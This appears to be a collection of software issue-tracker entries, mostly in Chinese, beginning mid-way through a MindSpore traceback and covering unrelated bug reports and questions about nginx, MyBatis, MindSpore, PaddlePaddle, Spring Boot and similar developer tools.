536 in cce_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 70 in wrapper File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 991 in build_cce File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/build_module.py"", line 804 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 397 in build_schedules_impl File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 414 in build_schedules File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 172 in build_cce File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/debug/decorators.py"", line 247 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/api/tik_build.py"", line 424 in BuildCCE File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_source_info.py"", line 44 in wrapper File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_for_last_dim.py"", line 410 in strided_slice_last_dim_with_vnchw_conv File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_for_last_dim.py"", line 46 in strided_slice_last_dim File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_d.py"", line 1314 in strided_slice_d File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 539 in _in_wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259 in call_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1271 in build_single_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1471 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1278 in loop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 218 in exec_compilation_task File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 99 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 297 in _bootstrap File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/spawn.py"", line 118 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 297 in _serve_one File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 261 in main File ""&lt;string&gt;"", line 1 in &lt;module&gt; Fatal Python error: Segmentation fault Current thread 0x00007f26f07e8740 (most recent call first): File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/_ffi/_ctypes/function.py"", line 208 in __call__ File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 220 in _static_lower_phase_3 File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 284 in cce_base_static_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 536 in cce_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 70 in wrapper File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 991 in build_cce File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/build_module.py"", line 804 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 397 in build_schedules_impl File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 414 in build_schedules File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 172 in build_cce File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/debug/decorators.py"", line 247 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/api/tik_build.py"", line 424 in BuildCCE File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_source_info.py"", line 44 in wrapper File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_for_last_dim.py"", line 410 in strided_slice_last_dim_with_vnchw_conv File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_for_last_dim.py"", line 46 in strided_slice_last_dim File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/strided_slice_d.py"", line 1314 in strided_slice_d File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 539 in _in_wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259 in call_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1271 in build_single_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1471 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1278 in loop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 218 in exec_compilation_task File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 99 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 297 in _bootstrap File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/spawn.py"", line 118 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 297 in _serve_one File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 261 in main File ""&lt;string&gt;"", line 1 in &lt;module&gt; [EXCEPTION] KERNEL(2179,7fe8ab75e740,python):2021-11-15-11:00:55.538.589 [mindspore/ccsrc/backend/kernel_compiler/tbe/ascend_kernel_compile.cc:384] ParseTargetJobStatus] Single op compile failed, op: cast_15335155066222186610_3 except_msg : None node trace: Corresponding forward node candidate: Traceback (most recent call last): File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/train_t.py"", line 808, in &lt;module&gt; train('../configs/pointpillars/ped_cycle/xyres_16.proto', '../MODEL_DOR_debug') File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/train_t.py"", line 507, in train raise e File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/train_t.py"", line 372, in train example_torch[""reg_targets""]) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 433, in __call__ raise err File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 430, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 352, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/models/trainnet.py"", line 132, in construct loss = self.network(*inputs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 433, in __call__ raise err File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 430, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 352, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/models/trainnet.py"", line 63, in construct reg_targets) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 433, in __call__ raise err File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 430, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 352, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/models/voxelnet.py"", line 592, in construct voxel_features = self.voxel_feature_extractor(voxels, num_points, coors) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 433, in __call__ raise err File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 430, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 352, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/disk1/guohangjiang/pillarpoints.mindspore/pointpillars/mindspore/models/pointpillars.py"", line 125, in construct f_center[:, :, 0] = ops.Sub()(features[:, :, 0], ops.Mul()(ops.ExpandDims()(coors[:, 3], 1), self.vx + self.x_offset)) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/tensor.py"", line 253, in __setitem__ self.assign_value(out) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/tensor.py"", line 346, in assign_value PynativeExecutor_.get_instance().execute_all_task() RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/ascend_kernel_compile.cc:384 ParseTargetJobStatus] Single op compile failed, op: cast_15335155066222186610_3 except_msg : None node trace: Corresponding forward node candidate: # [WARNING] MD(2179,7fe8ab75e740,python):2021-11-15-11:00:58.870.210 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 140632840455936 is not responding. Interrupt again [WARNING] MD(2179,7fe8ab75e740,python):2021-11-15-11:00:59.870.442 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] GeneratorOp(ID:4) Thread ID 140632840455936 is not responding. Interrupt again [WARNING] MD(2179,7fe7a27fc700,python):2021-11-15-11:00:59.892.566 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.__next__ new row, which might cause `GetNext` timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. Process finished with exit code 1"
文件上传接口经常报413,"环境信息 pigx版本: 3.10 前端部署在docker容器中 上传文件有时候会报413 有时候是一切正常 这是我nginx的配置 server { listen 8080; server_name localhost; } 这是我Dockerfile文件的配置 FROM nginx VOLUME /tmp ENV LANG C.UTF-8 ADD ./dist/ /data/pigx-ui/ ADD ./nginx.conf /etc/nginx/conf.d EXPOSE 8080 EXPOSE 443 upms文件上传配置 oss: endpoint: http://192.168.1.107:9000 access-key: wbangcloud secret-key: wbangcloud bucket-name: cloud-minio 测试过很多次 什么都不动的情况下，有时上传文件报413 有时正常   <code>: root /data/pigx-ui/; # 3.8 以后必须开启压缩 gzip on; gzip_static on; gzip_min_length 1k; gzip_comp_level 4; gzip_proxied any; gzip_types text/plain text/xml text/css; gzip_vary on; gzip_disable ""MSIE [1-6]\.(?!.*SV1)""; location ~* ^/(actuator|code|auth|admin|gen|daemon|tx|act|monitor|mp|job|pay) { proxy_pass http://cloud-gateway:9999; #proxy_set_header Host $http_host; proxy_connect_timeout 15s; proxy_send_timeout 15s; proxy_read_timeout 15s; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; }"
多行文本框粘贴内容报错,"从网页中复制纯文本内容，粘贴在多行文本框中，出如下错误该如何解决 多行文本框字段定义如下   <code>: { type: 'textarea', label: '申请材料', span: 12, display: true, prop: 'material', maxlength: 1500, showWordLimit: true, readonly: false, bind: 'claim.material' }, { type: 'textarea', label: '企业要求', span: 12, display: true, prop: 'enterprise', maxlength: 1500, showWordLimit: true, readonly: false, bind: 'claim.enterprise' }"
mybatis-spring发布了1.2.3，可能对拦截器有帮助,"https://github.com/mybatis/spring/pull/70/files   <code>: Class&lt;? extends MapperFactoryBean&gt; mapperFactoryBeanClass = annoAttrs.getClass(""factoryBean""); if (!MapperFactoryBean.class.equals(mapperFactoryBeanClass)) { scanner.setMapperFactoryBean(BeanUtils.instantiateClass(mapperFactoryBeanClass)); }"
请问，cookie过期时间不生效是浏览器的问题吗？,我看其他的网站是可以持久化的：csdn baidu   <code>: ruoyi项目里面配置的cookie过期时间为30天，但是关闭浏览器后，cookie默认就没了。
u-radio样式问题,"期待换成黑色或者其他对比色差高的颜色   <code>: 禁用状态的选中不明显,白色和灰色不易区分.是以下代码导致: iconColor () { return this.name == this.parent.value ? '#ff0000' : 'transparent'; },"
UrlUtils希望添加方法可以提取参数和值的Map键值对,"UrlUtils希望添加方法可以提取参数和值的Map键值对,如下方法是从别的地方弄过来的.希望你们能优化整合到hutool里   <code>: public class UrlUtil { public static class UrlEntity { /** * 基础url */ public String baseUrl; /** * url参数 */ public Map&lt;String, String&gt; params; } /** * 解析url * * @param url * @return */ public static UrlEntity parse(String url) { UrlEntity entity = new UrlEntity(); if (url == null) { return entity; } url = url.trim(); if (url.equals("""")) { return entity; } String[] urlParts = url.split(""\\?""); entity.baseUrl = urlParts[0]; //没有参数 if (urlParts.length == 1) { return entity; } //有参数 String[] params = urlParts[1].split(""&amp;""); entity.params = new HashMap&lt;&gt;(); for (String param : params) { String[] keyValue = param.split(""=""); entity.params.put(keyValue[0], keyValue[1]); } return entity; } }"
多数据源的bug,"场景： 另一个数据源是 db2的 问题： 1、MutiDataSourceProperties 这个类少了对dataSource 的 driverClassName 和validationQuery属性 重写 2、MybatisPlusConfig 这个类的 mutiDataSource 方法另一个数据源的名称是写死的 yml里配置的数据源名称不生效   <code>: hashMap.put(DSEnum.DATA_SOURCE_BIZ, bizDataSource);"
CellList 初始化顺序不同导致变量重命名问题,": /device ascend : -- MindSpore version : r1.3 commit 93474c4d -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 代码如下： 在使用 CellList 时，先初始化CellList 再append Cell 会导致Parameter 重复定义，在网络中会编译失败。 运行以上代码，net1中出现重复命名Parameter，而net2正常。   <code>: import numpy as np import mindspore from mindspore import nn, Parameter, Tensor class Cell1(nn.Cell): def __init__(self, name=''): super().__init__() self.weight = Parameter(np.random.random((1)).astype(np.float32)) self.bias = Parameter(np.random.random((1)).astype(np.float32)) def construct(self, x): return x * self.weight + self.bias class Cell2(nn.Cell): def __init__(self, name=''): super().__init__() self.weight = Parameter(np.random.random((1)).astype(np.float32)) self.bias = Parameter(np.random.random((1)).astype(np.float32)) def construct(self, x): return x * self.weight + self.bias class Net1(nn.Cell): def __init__(self, name=''): super().__init__() self.celllist1 = nn.CellList() self.celllist2 = nn.CellList() for i in range(2): self.celllist1.append(Cell1()) self.celllist2.append(Cell2()) def construct(self, x): for i in range(2): x = x + self.celllist1[i] x = x + self.celllist2[i] return x class Net2(nn.Cell): def __init__(self, name=''): super().__init__() self.celllist1_list = [] self.celllist2_list = [] for i in range(2): self.celllist1_list.append(Cell1()) self.celllist2_list.append(Cell2()) self.celllist1 = nn.CellList(self.celllist1_list) self.celllist2 = nn.CellList(self.celllist2_list) def construct(self, x): for i in range(2): x = x + self.celllist1[i] x = x + self.celllist2[i] return x print('--------net1--------') net1 = Net1() print(net1) for par in net1.trainable_params(): print(par) print('--------net2--------') net2 = Net2() print(net2) for par in net2.trainable_params(): print(par)"
使用tree后不能创建新选项,"具体代码如下   <code>: layui.xmSelect.render({ el: '#TagSelect', name: 'Tag', autoRow: true, filterable: true, create: function (val, arr) { if (arr.length === 0) { return { name: '创建-' + val, value: val } } }, tree: { show: true, showFolderIcon: true, showLine: true, indent: 20,//间距 expandedKeys: true, strict: false }, filterable: true, height: '300px', data() { return [&lt;%=TagJson%&gt;] } });"
CrudDao<> 查询的时候Count操作中的From子查询里有order by会报错,"生成的查询界面,报错查看了报错的sql 错误是:除非另外还指定了 TOP、OFFSET 或 FOR XML，否则，ORDER BY 子句在视图、内联函数、派生表、子查询和公用表表达式中无效。 下面是报错的sql:   <code>: SELECT count(0) FROM ( SELECT a.chargeitemid AS ""id"" FROM chargeitems a ORDER BY a.id DESC ) tmp_count"
Gitee 外网接口检查可配置,"由于项目可能是内部使用，无法访问外网，涉及到外网 Gitee 的接口检查需要进行可配置 使用 appsettings.json 文件进行配置   <code>: { ""GiteeHealthChecks"": false }"
"How to use capi to input ""integer_value""?","您好，我在使用capi调用训练的网络，网络的输入层如下： 现问题如下： 模型中的data layer非常多，capi中，也需要这么多slot来对应这些data layer吗？这样在代码中维护起来非常困难，有更简便的方法吗？ integer_value这种类型，我的网络后面接了embedding层，我在capi的样例程序中没有看到合适的输入样例：https://github.com/PaddlePaddle/Paddle/tree/develop/paddle/capi/examples/model_inference请问这种输入类型如何输入？使用样例中sequence的输入方式，把长度改为1，能够满足这种需求吗？   <code>: month = paddle.layer.data(name=""month"", type=paddle.data_type.integer_value(12)) week = paddle.layer.data(name=""week"", type=paddle.data_type.integer_value(7)) hour = paddle.layer.data(name=""hour"", type=paddle.data_type.integer_value(24)) city = paddle.layer.data(name=""city"", type=paddle.data_type.integer_value(3240)) phoneos = paddle.layer.data(name=""os"", type=paddle.data_type.integer_value(3)) homedist = paddle.layer.data(name=""homedist"", type=paddle.data_type.integer_value(10)) compdist = paddle.layer.data(name=""compdist"", type=paddle.data_type.integer_value(10)) homecity = paddle.layer.data(name=""homecity"", type=paddle.data_type.integer_value(3)) newcity = paddle.layer.data(name=""newcity"", type=paddle.data_type.integer_value(3)) gender = paddle.layer.data(name=""gender"", type=paddle.data_type.integer_value(3)) age = paddle.layer.data(name=""age"", type=paddle.data_type.integer_value(8)) life_stage = paddle.layer.data(name=""life_stage"", type=paddle.data_type.integer_value(22)) status = paddle.layer.data(name=""status"", type=paddle.data_type.integer_value(3)) trade = paddle.layer.data(name=""trade"", type=paddle.data_type.integer_value(24)) education = paddle.layer.data(name=""education"", type=paddle.data_type.integer_value(4)) job = paddle.layer.data(name=""job"", type=paddle.data_type.integer_value(7)) consumption = paddle.layer.data(name=""consumption"", type=paddle.data_type.integer_value(37)) catering_expense_level = paddle.layer.data(name=""catering_expense_level"", type=paddle.data_type.integer_value(4)) travelpref = paddle.layer.data(name=""travelpref"", type=paddle.data_type.dense_vector(4)) carowner = paddle.layer.data(name=""carowner"", type=paddle.data_type.dense_vector(1)) privatedriver = paddle.layer.data(name=""privatedriver"", type=paddle.data_type.dense_vector(1)) drive = paddle.layer.data(name=""drive"", type=paddle.data_type.dense_vector(3)) carserve = paddle.layer.data(name=""carserve"", type=paddle.data_type.dense_vector(3)) gas = paddle.layer.data(name=""gas"", type=paddle.data_type.dense_vector(3)) poi4s = paddle.layer.data(name=""poi4s"", type=paddle.data_type.dense_vector(3)) park = paddle.layer.data(name=""park"", type=paddle.data_type.dense_vector(3)) drive_weekday = paddle.layer.data(name=""drive_weekday"", type=paddle.data_type.dense_vector(3)) drive_weekend = paddle.layer.data(name=""drive_weekend"", type=paddle.data_type.dense_vector(3)) consumption_will = paddle.layer.data(name=""consumption_will"", type=paddle.data_type.dense_vector(36)) taghistyear = paddle.layer.data(name=""taghistyear"", type=paddle.data_type.dense_vector(802)) taghisthour = paddle.layer.data(name=""taghisthour"", type=paddle.data_type.dense_vector(802 * 24)) taghistweek = paddle.layer.data(name=""taghistweek"", type=paddle.data_type.dense_vector(802 * 2))"
[MS][usability]pls support scripts for generate hccn.conf,: /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_usability_modelzoo_003 hccl_tools需要完善，提供生成hccn.conf的脚本   <code>: model zoo的hccl_tools.py 依赖 /etc/hccn.conf 配置文件，但没有如何生成该配置文件的说明 提供自动生成hccn.conf配置文件的脚本
compiler warning by elementwise_op.h,"There are a lot of warning caused by :   <code>: elementwise_op.h /home/luotao02/Paddle/paddle/operators/elementwise_op.h(205): warning: function ""paddle::framework::OperatorBase::InferShape(const paddle::framework::Scope &amp;) const"" is hidden by ""paddle::operators::ElementwiseOp::InferShape"" -- virtual function override intended? /home/luotao02/Paddle/paddle/operators/elementwise_op.h(287): warning: function ""paddle::framework::OperatorBase::InferShape(const paddle::framework::Scope &amp;) const"" is hidden by ""paddle::operators::ElementwiseOpGrad::InferShape"" -- virtual function override intended? ..."
"[CT][MS]op pad gets wrong result with 5,6,7D input on GPU",": device GPU : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : python test_pad.py output_5d: [[[[[0 1 1 1 0 0] [0 1 1 1 0 0] [0 1 1 1 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0]]]]] output_6d: [[[[[[1 1 1 1 1 1] [1 1 1 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0]]]]]] output_7d: [[[[[[[1 1 1 1 1 1] [1 1 1 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0] [0 0 0 0 0 0]]]]]]] output_5d: [[[[[0 0 0 0 0 0] [0 0 1 1 1 0] [0 0 1 1 1 0] [0 0 1 1 1 0] [0 0 0 0 0 0] [0 0 0 0 0 0]]]]] output_6d: [[[[[[0 0 0 0 0 0] [0 0 1 1 1 0] [0 0 1 1 1 0] [0 0 1 1 1 0] [0 0 0 0 0 0] [0 0 0 0 0 0]]]]]] output_7d: [[[[[[[0 0 0 0 0 0] [0 0 1 1 1 0] [0 0 1 1 1 0] [0 0 1 1 1 0] [0 0 0 0 0 0] [0 0 0 0 0 0]]]]]]]   <code>: import numpy as np import mindspore.ops as P from mindspore import Tensor input_5d = Tensor(np.ones((1, 1, 1, 3, 3)).astype(np.int32)) paddings_5d = ((0, 0), (0, 0), (0, 0), (1, 2), (2, 1)) pad_5d = P.Pad(paddings_5d) output_5d = pad_5d(input_5d) print('output_5d:\n', output_5d) input_6d = Tensor(np.ones((1, 1, 1, 1, 3, 3)).astype(np.int32)) paddings_6d = ((0, 0), (0, 0), (0, 0), (0, 0), (1, 2), (2, 1)) pad_6d = P.Pad(paddings_6d) output_6d = pad_6d(input_6d) print('output_6d:\n', output_6d) input_7d = Tensor(np.ones((1, 1, 1, 1, 1, 3, 3)).astype(np.int32)) paddings_7d = ((0, 0), (0, 0), (0, 0), (0, 0), (0, 0), (1, 2), (2, 1)) pad_7d = P.Pad(paddings_7d) output_7d = pad_7d(input_7d) print('output_7d:\n', output_7d)"
java.io.IOException: Lexicon directory [file:/home/hc.xxxxxxxxxx-1.0.jar!/BOOT-INF/lib/jcseg-core-2.2.0.jar!//lexicon] does'n exists.,使用环境 : - centos 6.8 - jdk 1.8 - Springboot 1.5x jcseg版本 2.2 hc.xxxxxxxxxx-1.0.jar 是我的项目jar包名. 启动报错 错误代码如下: 麻烦大神们指导一下   <code>: java.io.IOException: Lexicon directory [file:/home/hc.xxxxxxxxxx-1.0.jar!/BOOT-INF/lib/jcseg-core-2.2.0.jar!//lexicon] does'n exists. at org.lionsoul.jcseg.tokenizer.core.ADictionary.loadDirectory(ADictionary.java:122) at org.lionsoul.jcseg.tokenizer.core.ADictionary.loadClassPath(ADictionary.java:178) at org.lionsoul.jcseg.tokenizer.core.DictionaryFactory.createDefaultDictionary(DictionaryFactory.java:86) at org.lionsoul.jcseg.tokenizer.core.DictionaryFactory.createDefaultDictionary(DictionaryFactory.java:125) at org.lionsoul.jcseg.tokenizer.core.DictionaryFactory.createSingletonDictionary(DictionaryFactory.java:151) at org.lionsoul.jcseg.tokenizer.core.DictionaryFactory.createSingletonDictionary(DictionaryFactory.java:137) at org.lionsoul.jcseg.analyzer.JcsegAnalyzer.&lt;init&gt;(JcsegAnalyzer.java:56) at org.lionsoul.jcseg.analyzer.JcsegAnalyzer.&lt;init&gt;(JcsegAnalyzer.java:33)
关于mysql多表查询，结果集不能查询问题，求解决方案？,"我使用的PageHelper版本是4.1.9，mybatis版本3.4.0, 使用接口mapper进行调用，采取调用方式 Page page= PageHelper.startPage(0, 2); 打印的日志是发了一条查询总数的sql， 使用page.getResult()不能正常返回结果 我写的sql： select m.id as menuId,r.id as roleId,m. as menuName ,r. as roleName from security_role_menu rm,security_role r,security_menu m where rm.role_id =r.id and rm.menu_id=m.id and r.id=39   <code>: name name"
Add version api,Fixed #2924:Integer values type We can use the version API as:   <code>: &gt;&gt;&gt; print paddle.version.version 0.10.0 &gt;&gt;&gt; print paddle.version.git_commit e1ac448c3320d8a11051fad63cc17f3803862236
问题，多个Repository 无法使用一个事务,"Furion 版本号 2.19 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 一个事务同时操作N个表，使用时存在问题。 请问操作多个表的事务方法是什么 IRepository tablebRepository; IRepository tablecRepository; // 开启事务 using (var transaction = _testRepository.Database.BeginTransaction()) { try { _testRepository.Insert(new Blog { Url = ""http://blogs.msdn.com/dotnet"" }); _testRepository.SaveNow(); tablebRepository.Insert(new Blog { Url = ""http://blogs.msdn.com/visualstudio"" });; tablecRepository.Insert(new Blog { Url = ""http://blogs.msdn.com/visualstudio"" });; tablebRepository.SaveNow(); tablecRepository.SaveNow(); } 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: _testRepository.Insert(new Blog { Url = ""http://blogs.msdn.com/visualstudio"" }); _testRepository.SaveNow(); var blogs = _testRepository.Entity .OrderBy(b =&gt; b.Url) .ToList(); // 提交事务 transaction.Commit(); } catch (Exception) { // 回滚事务 // transaction.RollBack(); // 新版本自动回滚了 }"
RuoyiFileApplication启动错误，没有配置文件,RuoyiFileApplication启动错误，对应的配置信息； file: prefix: domain: path: fdfs: domain: 这些都没有，但是补充后启动报错   <code>: endpoint must not be null
[ST][MS][CI][ssd_mobilenet_v1 ssd_resnet50_fpn][310P]网络在310环境编可执行文件失败,"网络在310环境编可执行文件失败 / 硬件环境: /device ascend310P : -- MindSpore version :commit_id = ''[sha1]:02bf0de9,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph ms_ssd_mobilenet_v1_fpn_data_200dk_300pocs_infer_ascend_mindir_0001.py pytest -s ms_ssd_mobilenet_v1_fpn_data_200dk_300pocs_infer_ascend_mindir_0001.py 编可执行文件成功，推理成功 转给龚立尧   <code>: WARNING: Package(s) not found: mindspore-ascend CMake Error: The following variables are used in this project, but they are set to NOTFOUND. Please set them or make sure they are set and tested correctly in the CMake files: MS_LIB linked by target ""main"" in directory /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/ssd_resnet50_fpn/infer/test_ms_ssd_resnet50_fpn_data_200dk_300pics_infer_ascend_mindir_0001/ascend310_infer CMake Warning at CMakeLists.txt:13 (add_executable): Cannot generate a safe runtime search path for target main because there is a cycle in the constraint graph: dir 0 is [/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore] dir 2 must precede it due to runtime library [_c_dataengine.cpython-37m-x86_64-linux-gnu.so] dir 1 is [/home/miniconda3/envs/ci39/lib/python3.9/site-packages/mindspore] dir 2 is [/home/miniconda3/lib/python3.7/site-packages/mindspore] dir 0 must precede it due to runtime library [_c_dataengine.cpython-37m-x86_64-linux-gnu.so] Some of these libraries may not be found correctly."
Creating and destroying operators in Executor::Run is slow in WhileOp,"The creating and destroying operators in is pretty slow. In , it takes 2.06 sec/12.53s. Almost 16% in and 12% in whole execution.   <code>: Executor::Run WhileOp while op"
"[CT][MS][OP] when the dtype is uint8, the grad of msssim  raise RuntimeError",": /device ascend : -- MindSpore version :ME+VM -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_msssim.py::test_msssim_input_type_uint8   <code>: def test_msssim_input_type_uint8(): fact = MSSSIMFactory(img_shape=(2,4,128,64),max_val=0.05, power_factors=[2, 3], filter_size=18, filter_sigma=2.0, k1=0.8, k2=0.38, dtype=np.uint8) fact.forward_cmp() fact.grad_cmp() ../share/ops/msssim_ops.py:88: in grad_cmp input_grad_ms_a, input_grad_ms_b = self.grad_mindspore_impl() ../share/ops/msssim_ops.py:62: in grad_mindspore_impl out_grad = grad_net(image1, image2, Tensor(self.output_grad)) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:280: in __call__ out = self.compile_and_run(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:535: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:522: in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._Executor object at 0xffff5954cf90&gt; obj = GradOfAllInputs&lt; (network): WrapOp&lt; (msssim): MSSSIM&lt; (multi_convs_list): CellList&lt; (0): Conv2d&lt;in...&gt; 